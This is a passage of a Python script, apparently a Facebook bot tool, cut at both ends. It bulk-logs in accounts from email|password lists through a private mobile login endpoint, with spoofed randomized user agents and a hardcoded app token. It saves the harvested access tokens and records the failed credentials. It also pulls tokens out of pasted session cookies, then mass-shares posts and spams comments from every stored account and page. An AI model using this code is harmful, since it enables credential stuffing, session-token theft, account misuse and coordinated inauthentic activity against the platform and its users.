                    sys.exit(f"{B}Invalid")
            elif opt in ['6', '06']:
                os.system('clear')
                print(logo_main)
                status = (f"{B}Inactive")
                print(f'{R}                     Status: {Y}({status}{Y}) ')
                linex()
                print(f'{R}Tokens have been removed.')
                linex()
                os.remove("token_zari.txt")
                time.sleep(5)
                main()
    except Exception as e:
        print(f"{R}Error: {e}")
    except requests.exceptions.ConnectionError:
        print(f'{R}NO INTERNET CONNECTION ')
        exit()
######TOKEN##########
semaphore = Semaphore(5)
def get_token():
    os.system('clear')
    print(logo_main)
    file_path = get_file_path()
    accounts = read_accounts_from_file(file_path)
    add_token = process_accounts(accounts)
    save_tokens(add_token)

def get_file_path():
    while True:
        print(f"{R}Ex: /sdcard/email.txt ")
        linex()
        file_path = input(f"{R}Enter File Path: ")
        linex()
        if os.path.exists(file_path):
            return file_path
        else:
            print(f"{B}File not found")
            time.sleep(1)
            main()

def read_accounts_from_file(file_path):
    try:
        with open(file_path, 'r') as f:
            accounts = f.read().splitlines()
            return accounts
    except FileNotFoundError:
        print(f"{B}File not found")
        return []

def process_accounts(accounts):
    add_token = []
    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(get_token_worker, account) for account in accounts]
        for future in futures:
            token = future.result()
            if token:
                add_token.append(token)
    return add_token

def save_tokens(tokens):
    with open("token.json", "w") as f:
        json.dump({"access_token": tokens}, f)
####UA GEN####
def ua():
    major_versions = [300, 321, 326, 330, 340, 350, 360, 370, 380] 
    major_version = random.choice(major_versions)
    minor_version = random.randint(50, 99) if major_version > 350 else random.randint(0, 49)
    patch_version = random.randint(500, 999) if major_version > 350 else random.randint(100, 499)
    
    fbav = f"{major_version}.{minor_version}.0.{patch_version}"
    fbbv = str(random.randint(100000000, 999999999))
    density = random.choice(["1.0", "1.5", "2.0", "2.5", "3.0", "4.0", "5.0", "6.0", "8.0"])

    width = random.choice(["1280", "1366", "1440", "1600", "1920", "2560", "2880", "3200", "3840", "4096", "5120"])
    height = random.choice(["720", "768", "900", "1080", "1440", "1600", "1800", "2160", "2400", "2880", "3200"])

    fblc = random.choice([
        "fr_FR", "en_US", "es_ES", "de_DE", "it_IT", "pt_BR", "zh_CN", "ja_JP", "ko_KR", "ar_AR", "ru_RU", "tr_TR",
        "pl_PL", "nl_NL", "sv_SE", "da_DK", "fi_FI", "no_NO", "cs_CZ", "hu_HU", "el_GR", "ro_RO", "sk_SK", "bg_BG",
        "hr_HR", "sr_RS", "lt_LT", "lv_LV", "et_EE", "ms_MY", "th_TH", "vi_VN", "id_ID", "hi_IN", "bn_BD", "fa_IR", "uk_UA", "he_IL"
    ])
    fbrv = str(random.randint(200000000, 900000000))
    
    fbca = random.choice(["x86", "x86_64", "amd64", "intel64", "arm64", "arm", "armv7", "armv8", "armv7l", "ia64", "ppc", "ppc64", "mips", "mips64", "sparc", "sparc64", "riscv", "riscv64"])
    
    fbpn_values = [
        "com.facebook.katana", 
        "com.facebook.lite", 
        "com.facebook.messenger",
        "com.facebook.web"
    ]
    fbpn = random.choice(fbpn_values)
    
    fbsrv = f"{random.randint(13, 18)}.0"
    fbop = str(random.randint(5, 30))

    hp_laptop_models = [
        "HP Pavilion 15", "HP Envy x360", "HP Spectre x360", 
        "HP EliteBook 840", "HP Omen 15", "HP ProBook 450",
        "HP Chromebook 14", "HP ZBook Studio G7", "HP Stream 14",
        "HP Elite Dragonfly", "HP Envy 13", "HP 15s", "HP EliteBook x360",
        "HP Pro x2", "HP ZBook Fury 15", "HP Envy 17", "HP Spectre Folio",
        "HP Pavilion x360", "HP Chromebook x2", "HP OMEN X 2S", "HP ENVY x2",
        "HP EliteBook 850", "HP ZBook Create G7", "HP Pavilion Gaming 16",
        "HP ENVY 15", "HP Omen X", "HP ZBook 17 G6", "HP Envy x2",
        "HP Omen 17", "HP Pavilion 14", "HP 250 G8", "HP EliteBook 1040",
        "HP Pavilion Gaming 15", "HP Chromebook 11", "HP ProBook 640",
        "HP EliteBook 830", "HP ZBook Power G8", "HP Omen Obelisk",
        "HP Spectre x2", "HP EliteBook 735", "HP Envy x360 15", 
        "HP ProBook 440", "HP Pavilion Aero 13", "HP ZBook Firefly 14",
        "HP Stream 11", "HP EliteBook 845", "HP Chromebook x360 14c",
        "HP ProBook 455", "HP Pavilion 13"
    ]

    dell_laptop_models = [
        "Dell XPS 13", "Dell XPS 15", "Dell Inspiron 15", "Dell Inspiron 13",
        "Dell Latitude 7420", "Dell Latitude 7320", "Dell Vostro 14", "Dell G5 15",
        "Dell Precision 3550", "Dell Alienware M15", "Dell G7 17", "Dell XPS 17",
        "Dell Inspiron 16 Plus", "Dell Latitude 9420", "Dell Precision 5550",
        "Dell Inspiron 14", "Dell Latitude 5520", "Dell Precision 5750", 
        "Dell Alienware X17", "Dell G3 15", "Dell Inspiron 14 5000", 
        "Dell Precision 7750", "Dell Vostro 13", "Dell Alienware Area-51m", 
        "Dell XPS 13 2-in-1", "Dell Latitude 3410", "Dell G15", "Dell Inspiron 7000", 
        "Dell Latitude 5400", "Dell Vostro 15 3000", "Dell Precision 3551",
        "Dell XPS 13 Plus", "Dell Inspiron 13 7000", "Dell Latitude 5430", 
        "Dell Precision 7560", "Dell Alienware m17 R5", "Dell G15 5515", 
        "Dell Inspiron 14 7000", "Dell Latitude 7440", "Dell XPS 15 9520", 
        "Dell G16", "Dell Inspiron 15 5000", "Dell Precision 3570", 
        "Dell Vostro 15 5000", "Dell Alienware x14", "Dell Latitude 7330", 
        "Dell XPS 13 OLED", "Dell Inspiron 16 7000", "Dell Precision 5580", 
        "Dell Alienware x17 R2", "Dell G15 5520", "Dell Inspiron 13 5000", 
        "Dell Latitude 7430", "Dell XPS 17 9720", "Dell Vostro 15 7000"
    ]

    lenovo_laptop_models = [
        "Lenovo ThinkPad X1 Carbon", "Lenovo Yoga Slim 7i", "Lenovo Legion 5",
        "Lenovo IdeaPad 3", "Lenovo Yoga 9i", "Lenovo ThinkBook 14s",
        "Lenovo ThinkPad T14", "Lenovo IdeaPad Flex 5", "Lenovo Yoga C940",
        "Lenovo ThinkPad P15", "Lenovo Legion 7", "Lenovo ThinkPad X13",
        "Lenovo Legion Y740", "Lenovo IdeaPad S540", "Lenovo ThinkPad X1 Extreme",
        "Lenovo ThinkPad L13", "Lenovo Yoga 7i", "Lenovo ThinkPad P1", "Lenovo Legion 5 Pro", 
        "Lenovo IdeaPad Gaming 3", "Lenovo ThinkPad X12 Detachable", "Lenovo Yoga Duet 7i", 
        "Lenovo Legion Slim 7", "Lenovo ThinkPad X280", "Lenovo IdeaPad 5", 
        "Lenovo ThinkBook Plus", "Lenovo ThinkPad L15", "Lenovo Yoga S940", 
        "Lenovo ThinkPad E14", "Lenovo ThinkPad P17", "Lenovo Legion Y530",
        "Lenovo ThinkPad X1 Yoga Gen 6", "Lenovo Yoga 9i 14", "Lenovo Legion 7i", 
        "Lenovo IdeaPad 5 Pro", "Lenovo ThinkBook 15 Gen 3", "Lenovo Yoga 6", 
        "Lenovo ThinkPad X1 Nano", "Lenovo Legion 5i Pro", "Lenovo IdeaPad Flex 5i", 
        "Lenovo ThinkPad L15 Gen 2", "Lenovo Yoga 9i 15", "Lenovo ThinkPad P52", 
        "Lenovo ThinkPad T15", "Lenovo Legion 5 Pro 16", "Lenovo IdeaPad Gaming 3i", 
        "Lenovo ThinkPad X1 Carbon Gen 10", "Lenovo Yoga 7i 14", "Lenovo Legion 5i", 
        "Lenovo IdeaPad 5i Pro", "Lenovo ThinkPad P43s", "Lenovo Yoga C9", 
        "Lenovo ThinkPad X1 Fold", "Lenovo ThinkBook 14 Gen 2", "Lenovo Legion 7i Pro", 
        "Lenovo Yoga 9i 13", "Lenovo IdeaPad Gaming 3 Pro"
    ]

    acer_laptop_models = [
        "Acer Swift 3", "Acer Predator Helios 300", "Acer Aspire 5", "Acer Spin 5",
        "Acer Chromebook 314", "Acer Nitro 5", "Acer TravelMate P6", "Acer ConceptD 7",
        "Acer Enduro N7", "Acer Chromebook Spin 713", "Acer Aspire 7", "Acer Swift 7",
        "Acer TravelMate P2", "Acer Aspire E 15", "Acer Swift X", "Acer Aspire 3", 
        "Acer Spin 3", "Acer Predator Triton 300", "Acer Enduro Urban N3", 
        "Acer ConceptD 3", "Acer Chromebook 514", "Acer Nitro 7", "Acer Aspire S3", 
        "Acer Spin 7", "Acer TravelMate X5", "Acer Enduro T1", "Acer Aspire VX 15", 
        "Acer Swift 5", "Acer TravelMate B3", "Acer Predator Helios 500",
        "Acer Aspire Vero", "Acer Predator Triton 500 SE", "Acer Chromebook 317",
        "Acer Swift Edge", "Acer Aspire 5 A515", "Acer Nitro 16", 
        "Acer Spin 714", "Acer Enduro Urban T3", "Acer TravelMate P4",
        "Acer ConceptD 9", "Acer Chromebook 315", "Acer Aspire 5 Slim",
        "Acer Swift Go", "Acer Predator Helios Neo 16", "Acer Chromebook Vero 514",
        "Acer Aspire 7 Nitro 5", "Acer Predator Helios 700", "Acer Swift 5X", 
        "Acer Aspire 5 Pro", "Acer Nitro 50", "Acer Predator Triton 300 SE",
        "Acer Chromebook 311", "Acer ConceptD 7 Ezel", "Acer Enduro T5", 
        "Acer Swift 3X", "Acer Predator Helios 300 SE", "Acer Aspire 3 A315",
        "Acer Spin 5 Pro", "Acer Nitro 5 AN515", "Acer Chromebook 11 C732",
        "Acer ConceptD 5", "Acer Enduro N3", "Acer Aspire 1", "Acer Swift 3 SF314"
    ]

    asus_laptop_models = [
        "ASUS ZenBook Duo", "ASUS ROG Zephyrus G14", "ASUS VivoBook S15", "ASUS TUF Dash F15",
        "ASUS Chromebook Flip", "ASUS ExpertBook B9", "ASUS ROG Strix G15", "ASUS ZenBook 14",
        "ASUS VivoBook Flip 14", "ASUS ROG Flow X13", "ASUS ProArt StudioBook Pro", "ASUS TUF Gaming A15",
        "ASUS ZenBook Pro Duo", "ASUS VivoBook 15", "ASUS ROG Zephyrus M16", "ASUS ZenBook 13",
        "ASUS Chromebook C425", "ASUS VivoBook S14", "ASUS ZenBook Flip S", "ASUS TUF Gaming F17",
        "ASUS ROG Strix Scar 15", "ASUS VivoBook Ultra K15", "ASUS ZenBook S",
        "ASUS ROG Zephyrus G15", "ASUS VivoBook Pro 14", "ASUS ROG Zephyrus S17", "ASUS ExpertBook P1",
        "ASUS ROG Zephyrus Duo 15", "ASUS VivoBook E14",
        "ASUS ZenBook Flip 13", "ASUS VivoBook K571", "ASUS ExpertBook L1",
        "ASUS ROG Strix Scar 17", "ASUS Chromebook CX9", "ASUS TUF Gaming FX505",
        "ASUS ZenBook UX425", "ASUS ROG Strix G17", "ASUS VivoBook 14",
        "ASUS ProArt StudioBook 16", "ASUS TUF Gaming FX705", "ASUS ZenBook Flip 15",
        "ASUS VivoBook 17", "ASUS ROG Zephyrus G GA502", "ASUS ExpertBook P2",
        "ASUS ROG Strix Hero III", "ASUS ZenBook UX434", "ASUS VivoBook Flip TP470",
        "ASUS ROG Zephyrus Duo SE", "ASUS Chromebook C223", "ASUS VivoBook Ultra 15",
        "ASUS ZenBook 15", "ASUS ROG Flow X16", "ASUS TUF Gaming A17",
        "ASUS VivoBook Flip TP401", "ASUS ROG Zephyrus GX501", "ASUS VivoBook E12",
        "ASUS ZenBook Pro 15", "ASUS ROG Zephyrus S GX701", "ASUS TUF Gaming FX506",
        "ASUS Chromebook Flip C434", "ASUS ZenBook Pro 14", "ASUS VivoBook 13 Slate OLED",
        "ASUS ROG Zephyrus M GU502", "ASUS Chromebook Detachable CM3", "ASUS VivoBook Pro 15",
        "ASUS TUF Dash F17", "ASUS ZenBook Flip UX363", "ASUS ROG Strix Scar III",
        "ASUS VivoBook S14 S433", "ASUS Chromebook Flip C536", "ASUS ROG Zephyrus G15 GA503",
        "ASUS VivoBook Flip TM420", "ASUS ZenBook Pro Duo UX581", "ASUS ExpertBook B1",
        "ASUS VivoBook Flip 12", "ASUS ROG Strix G531", "ASUS ZenBook 14X OLED",
        "ASUS TUF Gaming A15 FA506", "ASUS ZenBook Flip 14 UX463", "ASUS VivoBook 15 X515",
        "ASUS ROG Zephyrus G15 GA502", "ASUS ZenBook S UX393", "ASUS Chromebook Flip C214",
        "ASUS ZenBook Pro Duo 15", "ASUS ExpertBook B3 Flip", "ASUS VivoBook Ultra K14",
        "ASUS ROG Zephyrus Duo 16", "ASUS Chromebook C202", "ASUS TUF Dash FX516",
        "ASUS ZenBook 13 OLED", "ASUS VivoBook S14 M433", "ASUS ZenBook Flip UX461",
        "ASUS ROG Zephyrus GX531", "ASUS VivoBook Ultra A512", "ASUS Chromebook C523",
        "ASUS ZenBook 13 UX325", "ASUS TUF Gaming FX504", "ASUS ZenBook Flip S UX370",
        "ASUS VivoBook Flip TP501", "ASUS ZenBook Flip 14 UM462", "ASUS Chromebook C302",
        "ASUS VivoBook Flip 14 TP412", "ASUS ZenBook Pro Duo UX582", "ASUS VivoBook 15 X512"
    ]
    
    alienware_laptop_models = [
        "Alienware m15 R7", "Alienware x15 R2", "Alienware x17 R2", 
        "Alienware m17 R5", "Alienware Area-51m R2", "Alienware m15 R6", 
        "Alienware m17 R4", "Alienware x17 R1", "Alienware Area-51m", 
        "Alienware 13 R3", "Alienware 17 R5", "Alienware Aurora R11", 
        "Alienware 15 R2", "Alienware 18", "Alienware m15 R5", 
        "Alienware 15 R3", "Alienware Area-51m R1", "Alienware 17 R4",
        "Alienware m15", "Alienware 13 R2", "Alienware x14", "Alienware M11x", 
        "Alienware M14x", "Alienware M17x", "Alienware 17 R3", 
        "Alienware 15 R4", "Alienware 13 R1", "Alienware 18 R1", 
        "Alienware M17", "Alienware Aurora R10", "Alienware Aurora R9"
    ]

    samsung_laptop_models = [
        "Samsung Galaxy Book Pro 360", "Samsung Galaxy Book Flex2 Alpha", 
        "Samsung Galaxy Book Ion", "Samsung Galaxy Book Go", "Samsung Notebook 9 Pro", 
        "Samsung Notebook Odyssey Z", "Samsung Galaxy Book S", "Samsung Notebook 7 Spin", 
        "Samsung Notebook 9 Pen", "Samsung Chromebook Plus V2", 
        "Samsung Galaxy Chromebook 2", "Samsung Notebook 5", "Samsung Galaxy Book Ion2", 
        "Samsung Galaxy Book Flex Alpha", "Samsung ATIV Book 9", "Samsung ATIV Book 4", 
        "Samsung Notebook 9", "Samsung Chromebook 4", "Samsung ATIV Book 8", 
        "Samsung Chromebook Pro", "Samsung Galaxy Chromebook", 
        "Samsung Galaxy Book Flex 15", "Samsung Galaxy Book Pro", "Samsung Chromebook Plus", 
        "Samsung ATIV Book 2", "Samsung Notebook Series 7", "Samsung Notebook Series 9", 
        "Samsung Galaxy Book Flex 13", "Samsung Notebook 7", "Samsung ATIV Smart PC"
    ]

    razer_laptop_models = [
        "Razer Blade 15 Advanced Model", "Razer Blade 14", "Razer Blade Stealth 13", 
        "Razer Blade Pro 17", "Razer Book 13", "Razer Blade 15 Base Model", 
        "Razer Blade 17 Pro", "Razer Blade Stealth 12.5\"", "Razer Blade Studio Edition", 
        "Razer Blade 13 Mercury White", "Razer Blade 13 Quartz Pink", "Razer Blade 15 OLED", 
        "Razer Book 2020 Edition", "Razer Blade 15 Advanced Model 2021", 
        "Razer Blade 15 Base Model 2020", "Razer Blade 17 Pro 2021", 
        "Razer Blade Pro 17 2020", "Razer Blade 15 OLED 2020", 
        "Razer Blade 15 Base Model 2021", "Razer Blade Stealth 2021", 
        "Razer Blade 14 2021", "Razer Blade Pro 2021", "Razer Blade 13 Early 2020", 
        "Razer Blade Stealth 2019", "Razer Blade Stealth 2017", "Razer Blade 2016", 
        "Razer Blade Pro 2017", "Razer Blade 15 Advanced Model 2018", 
        "Razer Blade 15 Base Model 2019", "Razer Blade Stealth 2018"
    ]

    msi_laptop_models = [
        "MSI GE76 Raider", "MSI GS66 Stealth", "MSI Creator Z16", "MSI GP66 Leopard", 
        "MSI Summit E13 Flip Evo", "MSI GS75 Stealth", "MSI GL65 Leopard", 
        "MSI GT76 Titan", "MSI Prestige 14 Evo", "MSI Alpha 15", "MSI Modern 15", 
        "MSI Prestige 15 A10SC", "MSI Bravo 15", "MSI Katana GF66", "MSI Pulse GL66", 
        "MSI GF63 Thin", "MSI WS66", "MSI WE75", "MSI GF65 Thin", "MSI Stealth 15M", 
        "MSI Prestige 15", "MSI WS75", "MSI Modern 14", "MSI GP65 Leopard", 
        "MSI Prestige 14", "MSI GT75 Titan", "MSI GL63", "MSI GV72", 
        "MSI GL72M", "MSI GL62M", "MSI GS63VR"
    ]

    lg_laptop_models = [
        "LG Gram 17", "LG Gram 16 2-in-1", "LG Gram 14", "LG Ultra PC 17", 
        "LG Ultra Gear 17", "LG Gram 15Z90N", "LG Gram 14Z90P", "LG Gram 16Z90P", 
        "LG Gram 13.3\"", "LG Gram Ultra-Light", "LG Gram Ultra Slim", 
        "LG Gram 17Z90P", "LG Gram 14T90N", "LG Ultra-Light 14U70Q", 
        "LG Gram 14T90P", "LG Gram 16T90P", "LG Ultra PC 16", 
        "LG Ultra Gear 15", "LG Gram 15Z90P", "LG Gram 17Z90N", "LG Gram 16T90N", 
        "LG Gram 13Z990", "LG Gram 14Z990", "LG Ultra Gear 16", 
        "LG Gram 15Z980", "LG Gram 17Z980", "LG Gram 15Z990", "LG Ultra-Light 15", 
        "LG Gram 14Z980", "LG Gram 17T90P"
    ]

    brands = {
        "HP": hp_laptop_models,
        "Dell": dell_laptop_models,
        "Lenovo": lenovo_laptop_models,
        "Acer": acer_laptop_models,
        "ASUS": asus_laptop_models,
        "Alienware": alienware_laptop_models,
        "Samsung": samsung_laptop_models,
        "Razer": razer_laptop_models,
        "MSI": msi_laptop_models
    }

    manufacturer = random.choice(list(brands.keys()))
    model = random.choice(brands[manufacturer])

    operating_systems = ["Windows 10", "Windows 11", "Windows 8.1", "Windows 7", "Ubuntu", "Fedora", "Debian", "Linux Mint", "Elementary OS", "Chrome OS", "Pop!_OS", "Red Hat Enterprise Linux", "Linux", "CentOS", "Manjaro Linux", "OpenSUSE", "Solus", "MX Linux"]
    os_choice = random.choice(operating_systems)

    carriers = [
        "Robi", "AT&T", "Verizon", "T-Mobile", "Vodafone", "Orange", "Telekom", "O2", "BT", 
        "Movistar", "Claro", "Telstra", "Sprint", "Airtel", "Reliance Jio", "China Mobile", 
        "China Telecom", "China Unicom", "NTT DoCoMo", "SoftBank", "KDDI", "SK Telecom", 
        "KT Corporation", "LG Uplus", "TIM", "Wind Tre", "Bouygues Telecom", "SFR", "Telkomsel", 
        "Indosat Ooredoo", "XL Axiata", "Smartfren", "TrueMove", "AIS", "DTAC", "MTN", "Vodacom", 
        "Cell C", "Telstra", "Optus", "Singtel", "StarHub", "M1", "Globe Telecom", "Smart Communications", 
        "PLDT", "Digicel", "Claro Brazil", "Oi", "TIM Brasil", "Vivo", "Entel", "Movilnet", "Claro Peru", 
        "Entel Chile", "Tigo", "Personal", "Claro Argentina", "Movistar Argentina", "Movistar Venezuela", 
        "Claro Colombia", "Movistar Colombia", "Movistar Mexico", "Claro Ecuador", "CNT Ecuador", 
        "Movistar Uruguay", "Claro Uruguay", "U Mobile", "Maxis", "Celcom", "Digi Telecommunications", 
        "Free Mobile", "Bouygues Telecom", "SFR", "Wind Hellas", "Cosmote", "MTN Cyprus", 
        "Vodafone Cyprus", "Telecom Italia", "KPN", "Telfort", "Vodafone Netherlands", "Proximus", 
        "Orange Belgium", "BASE", "Swisscom", "Sunrise", "Salt Mobile", "A1 Telekom Austria", 
        "T-Mobile Austria", "Magenta Telekom", "Hutchison Drei Austria", "Telenor", "Telia", "Elisa", 
        "DNA", "Tele2", "Megafon", "MTS", "Beeline", "Tele2 Russia", "Kyivstar", "Vodafone Ukraine", 
        "Lifecell", "Moldcell", "Orange Moldova", "Unitel Mongolia", "G-Mobile", "Mobicom", "Ooredoo Myanmar", 
        "MPT", "Telenor Myanmar", "STC", "Mobily", "Zain", "Du", "Etisalat", "Batelco", "Viva Bahrain", 
        "Ooredoo Qatar", "Vodafone Qatar", "Omantel", "Ooredoo Oman", "Tata DoCoMo", "BSNL", "MTNL"
    ]
    carrier = random.choice(carriers)

    user_agent = (
        f"[FBAN/FBWEB;FBAV/{fbav};FBBV/{fbbv};"
        f"FBDM{{density={density},width={width},height={height}}};"
        f"FBLC/{fblc};FBRV/{fbrv};"
        f"FBCR/{carrier};FBMF/{manufacturer};FBBD/{manufacturer};"
        f"FBPN/{fbpn};FBDV/{model};FBSV/{fbsrv};FBOP/{fbop};FBCA/{fbca};]"
    )
    return user_agent
def get_token_worker(account):
    account_data = account.split('|')
    url = 'https://b-graph.facebook.com/auth/login'
    form = {
        'adid': 'e3a395f9-84b6-44f6-a0ce-fe83e934fd4d',
        'email': account_data[0],
        'password': account_data[1],
        'format': 'json',
        'device_id': '67f431b8-640b-4f73-a077-acc5d3125b21',
        'cpl': 'true',
        'family_device_id': '67f431b8-640b-4f73-a077-acc5d3125b21',
        'locale': 'en_US',
        'client_country_code': 'US',
        'credentials_type': 'device_based_login_password',
        'generate_session_cookies': '1',
        'generate_analytics_claim': '1',
        'generate_machine_id': '1',
        'currently_logged_in_userid': '0',
        'irisSeqID': 1,
        'try_num': '1',
        'enroll_misauth': 'false',
        'meta_inf_fbmeta': 'NO_FILE',
        'source': 'login',
        'machine_id': 'KBz5fEj0GAvVAhtufg3nMDYG',
        'meta_inf_fbmeta': '',
        'fb_api_req_friendly_name': 'authenticate',
        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
        'api_key': '882a8490361da98702bf97a021ddc14d',
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
    }
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-friendly-name': 'fb_api_req_friendly_name',
        'x-fb-http-engine': 'Liger',
        'user-agent': ua(),
    }

    try:
        with semaphore:
            response = requests.post(url, data=form, headers=headers)
            response.raise_for_status()

        response_data = response.json()
        if 'access_token' in response_data:
            token = response_data['access_token']
            with open("token_zari.txt", "a") as f:
                f.write(token + "\n")
            print(f"{R}LOGIN SUCCESSFULLY!")
            linex()
            return token
        else:
            print(f"{B}Error for email {account_data[0]}: {response_data['error_msg']}")
            linex()
            with open('/sdcard/BOOST-EMAIL.txt', 'a') as f:
                f.write(f"{account_data[0]}|{account_data[1]}\n")
            linex()
            return None
    except requests.exceptions.RequestException as e:
        print(f"{B}Request error: {e}")
        linex()
        return None
    except (ValueError, json.JSONDecodeError) as e:
        print(f"{B}{error}: {e}")
        linex()
        return None

######AUTO SHARE#######
def login():
	os.system("clear")
	print(logo_share)
	cookie = input(f"{R}Cookie: ")
	linex()
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		open("token.txt", "w").write(find_token.group(1))
		open("cookie.txt", "w").write(cookie)
		print(f"{R}LOGIN SUCCESSFULLY");time.sleep(2)
		bot_share()
	except:
		os.system("rm token.txt cookie.txt > /dev/null 2>&1")
		print(f"{B}Invalid cookie");time.sleep(1.5) 
		login()		
def bot_share():
    os.system('clear')
    print(logo_share)
    try:
        token = open("token.txt","r").read()
        cok = open("cookie.txt","r").read()
        cookie = {"cookie":cok}
        nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}",cookies=cookie).json()["name"]
        id = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token),cookies={"cookie":cok}).json()["id"]	    
        requests.post(f"https://graph.facebook.com/826244541950192/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
    except:
        os.system("rm token.txt cookie.txt > /dev/null 2>&1")
        print(f"{R}Invalid cookie");time.sleep(1.5)
        login()
    os.system('clear')
    print(logo_share)
    link = input(f"{R}Post link: ")
    linex()
    lmt = int(input(f"{R}Share Limit: "))
    linex()
    try:
        n = 0
        header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"}
        for x in range(lmt):
            n+=1
            post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
            data = json.loads(post)
            if "id" in post:
                print(f"{R}SUCCESSFULLY SHARED [{x+1}]")
                linex()
            else:
                print(f'{B}INVALID');exit()
            if n == lmt:
                print(f"{B}SHARE LIMIT REACHED. SENT {lmt} SHARE")
                linex()
                input(f"{B}PRESS ENTER TO GO BACK ")
                main()
    except requests.exceptions.ConnectionError:
        print(f'{R}NO INTERNET CONNECTION');exit()
#######AUTO COMMENT FB PAGE POST#######
def perform_comment(post_id, comment_text, comment_limit=1):
    #os.system('clear')
    #print(logo_cmnt)
    comments = comment_text.split('|')
    total_comments_sent = 0
    comment_index = 0

    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            if total_comments_sent >= comment_limit:
                break

            if comment_index < len(comments):
                comment = comments[comment_index]
            else:
                comment_index = 0
                comment = comments[comment_index]

            try:
                response = requests.get(f'https://graph.facebook.com/me/accounts', headers={'Authorization': f'Bearer {access_token}'}).json()

                for page in response.get('data', []):
                    page_access_token = page.get('access_token', '')
                    page_name = page.get('name', '')

                    try:
                        url = f'https://graph.facebook.com/v18.0/{post_id}/comments'
                        headers = {
                            'content-type': 'application/x-www-form-urlencoded',
                            'x-fb-friendly-name': 'fb_api_req_friendly_name',
                            'x-fb-http-engine': 'Liger',
                            'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
                        }
                        params = {'access_token': page_access_token, 'message': comment}
                        response = requests.post(url, params=params, headers=headers)

                        if response.status_code == 200:
                            total_comments_sent += 1
                            print(f"{R}SUCCESSFULLY COMMENTED! | {page_name} : {comment} ")
                            linex()
                            time.sleep(3)
                        else:
                            print(f"{B}FAILED TO POST COMMENT")
                            linex()
                    except requests.exceptions.RequestException as error:
                        print(f"{error}")
            except requests.exceptions.RequestException as error:
                print(f"{error}")

            comment_index += 1

    except Exception as e:
        print(f"{B}An error occurred: {e}")

    print(f"{B}COMMENT LIMIT REACHED. SENT {total_comments_sent} COMMENTS.")
    linex()
    input(f"{B}PRESS ENTER TO GO BACK ")


#######AUTO COMMENT ACCOUNT POST######           
def perform_comment_acc(post_id, comment_text, comment_limit=1):
    #os.system('clear')
    #print(logo_cmnt)
    comments = comment_text.split('|')
    total_comments_sent = 0
    comment_index = 0

    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            if total_comments_sent >= comment_limit:
                break

            if comment_index < len(comments):
                comment = comments[comment_index]
            else:
                comment_index = 0 
                comment = comments[comment_index]

            try:
                url = f'https://graph.facebook.com/v18.0/{post_id}/comments'
                headers = {
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-friendly-name': 'fb_api_req_friendly_name',
                    'x-fb-http-engine': 'Liger',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
                }
                params = {'access_token': access_token, 'message': comment}
                response = requests.post(url, params=params, headers=headers)

                if response.status_code == 200:
                    total_comments_sent += 1
                    print(f"{R}SUCCESSFULLY COMMENTED! | {comment} ")
                    linex()
                    time.sleep(3)
                else:
                    print(f"{B}FAILED TO COMMENT")
            except requests.exceptions.RequestException as error:
                print(f"{error}")

            comment_index += 1 

    except Exception as e:
        print(f"{B}An error occurred: {e}")

    print(f"{B}COMMENT LIMIT REACHED. SENT {total_comments_sent} COMMENTS.")
    linex()
    input(f"{B}PRESS ENTER TO GO BACK ")


########AUTO MIX COMMENT POST#######
def perform_comment_mix(post_id, comment_text, comment_limit=1):
    #os.system('clear')
    #print(logo_cmnt)
    comments = comment_text.split('|')
    total_comments_sent = 0
    comment_index = 0

    try:
        with open("token_zari.txt","r") as f:
            add_token = [line.strip() for line in f.readlines()]
        for access_token in add_token:
            if total_comments_sent >= comment_limit:
                break

            if comment_index < len(comments):
                comment = comments[comment_index]
            else:
                comment_index = 0 
                comment = comments[comment_index]

            try:
                url = f'https://graph.facebook.com/v18.0/{post_id}/comments'
                headers = {
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-friendly-name': 'fb_api_req_friendly_name',
                    'x-fb-http-engine': 'Liger',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO Mobile KG8 Build/RP1A.856858.096) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5951.90 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/265.0.0.11.119;]'
                }
                params = {'access_token': access_token, 'message': comment}
                response = requests.post(url, params=params, headers=headers)

                if response.status_code == 200:
                    total_comments_sent += 1
                    print(f"{R}SUCCESSFULLY COMMENTED USING FB ACCOUNT!")
                    linex()
                    time.sleep(2)
